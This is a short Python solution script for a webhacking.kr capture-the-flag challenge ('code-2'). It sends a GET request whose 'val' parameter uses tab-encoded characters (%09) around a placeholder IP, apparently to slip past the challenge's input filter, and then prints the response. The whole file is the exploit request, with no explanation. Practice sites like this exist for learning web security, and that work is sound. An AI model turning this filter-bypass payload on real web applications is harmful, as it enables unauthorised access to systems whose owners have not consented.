import requests

if __name__ == "__main__":
    IP = "YOUR_IP_ADDRESS"
    url = f"https://webhacking.kr/challenge/code-2/?val=1aaaaa_{IP}%09p%09a%09s%09s"
    cookies = {"PHPSESSID": ""}
    response = requests.get(url)
    print(response.text)
